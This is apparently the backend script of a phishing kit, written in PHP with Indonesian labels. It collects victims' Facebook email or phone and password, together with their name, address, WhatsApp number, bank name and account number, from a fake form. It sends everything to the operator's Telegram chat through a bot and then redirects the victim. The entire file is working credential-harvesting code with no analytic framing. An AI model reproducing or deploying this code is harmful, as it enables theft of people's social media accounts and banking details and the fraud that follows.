<?php
include 'zack/cucuk.php';
include 'zack_tele.php';

$mail = $_POST['mail'];
$pass = $_POST['pass'];
$user = $_POST['user2'];
$fb = $_POST['fb2'];
$alamat = $_POST['alamat2'];
$kota = $_POST['kota2'];
$wa = $_POST['wa2'];
$bank = $_POST['bank2'];
$narek = $_POST['narek2'];
$norek = $_POST['norek2'];

function sendMessage($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
}

$pesantelegram = <<<EOD
  *HASIL AKUN FB BW*
──────────────────────
hp/email : $mail
kata sandi : $pass
──────────────────────
nama : $user
facebook : $fb
alamat : $alamat
kota/provinsi : $kota
hp/wa : $wa
bank : $bank
nmrek : $narek
norek : $norek
──────────────────────

EOD;

sendMessage($telegram_id, $pesantelegram, $secret_token);
header('location: ./yumen.php');